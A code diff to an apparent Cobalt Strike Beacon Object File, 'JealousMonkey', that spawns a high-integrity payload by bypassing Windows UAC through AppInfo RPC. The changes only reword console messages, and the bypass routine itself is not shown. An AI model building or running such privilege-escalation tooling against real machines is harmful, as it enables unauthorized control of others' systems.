@@ -462,7 +462,7 @@ void go(char *args, unsigned long alen) {
     BeaconDataParse(&parser, args, (int)alen);
     payloadArg = (wchar_t *)BeaconDataExtract(&parser, NULL);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] JealousMonkey UAC bypass\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] MONKEY IS GETTING JEALOUS...\n");
 
     if (!is_user_admin()) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Local admin required (UAC-filtered token ok)\n");
@@ -482,12 +482,13 @@ void go(char *args, unsigned long alen) {
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Launching elevated child via AppInfo RPC...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Launching elevated child via AppInfo RPC...\n");
 
     status = uac_bypass_method59(payload);
 
     if (NT_SUCCESS(status)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS: high-integrity payload spawned\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: high-integrity process spawned!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] MONKEY is pleased ))\n");
         return;
     }
 
